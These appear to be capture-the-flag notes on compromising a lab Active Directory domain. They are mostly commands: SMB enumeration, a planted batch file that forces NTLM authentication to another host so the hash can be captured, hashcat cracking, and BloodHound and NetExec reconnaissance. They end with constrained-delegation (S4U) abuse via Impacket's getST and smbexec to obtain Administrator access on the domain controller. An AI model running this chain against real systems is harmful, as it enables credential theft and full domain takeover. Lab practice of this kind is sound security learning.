```
smbclient -L //10.128.146.136 -N

smbclient //10.128.146.136/IT-Shared -N
```
```
test.bat

@echo off
dir \\10.128.96.80\share > nul 2>&1
```
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```
```
nxc smb 10.128.146.136 -u 'svc.scanner' -p '1summerlove!'
```
```
/etc/hosts

10.128.146.136 DC01.ctf.local ctf.local DC01
```
```
nxc smb 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!' --shares

smbclient -L //10.128.146.136 -U 'ctf.local/svc.scanner%1summerlove!'
```
```
check if account has access to winrm

nxc winrm 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!'
```
```
nxc smb 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!' --users
nxc smb 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!' --groups
nxc smb 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!' --pass-pol
```
```
nxc smb 10.128.146.136 -d ctf.local -u 'svc.scanner' -p '1summerlove!' --rid-brute
```
```
bloodhound-python -u svc.scanner -p '1summerlove!' -d ctf.local -ns 10.128.146.136 -dc DC01.ctf.local -c all
```
```
bloodhound-python -u svc.scanner -p '1summerlove!' -d ctf.local -ns 10.128.146.136 -c All --zip
```
```
impacket.findDelegation ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.128.146.136
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
```
```
AccountName  AccountType  DelegationType                      DelegationRightsTo   SPN Exists 
-----------  -----------  ----------------------------------  -------------------  ----------
svc.scanner  Person       Constrained w/ Protocol Transition  cifs/DC01            No         
svc.scanner  Person       Constrained w/ Protocol Transition  cifs/DC01.ctf.local  No
```


svc.scanner is allowed to ask Kerberos:
 "Give me a ticket to access CIFS on DC01 as another user."
 
Because protocol transition was enabled, it could do that even without the target user’s password.

```
impacket.getST   -spn cifs/DC01.ctf.local   -impersonate Administrator   -dc-ip 10.128.146.136   ctf.local/svc.scanner:'1summerlove!'
```

getST abused Kerberos S4U. performed two Kerberos steps internally:

S4U2Self  -> ask for a ticket representing Administrator to svc.scanner
S4U2Proxy -> use that to request a service ticket to cifs/DC01 as Administrator

in case of issue: unset KRB5CCNAME

```
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache

impacket.smbexec -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

--- attackbox --
```
findDelegation.py ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.128.146.136

getST.py -spn cifs/DC01.ctf.local   -impersonate Administrator   -dc-ip 10.128.146.136   ctf.local/svc.scanner:'1summerlove!'

export KRB5CCNAME=Administrator.ccache

smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```
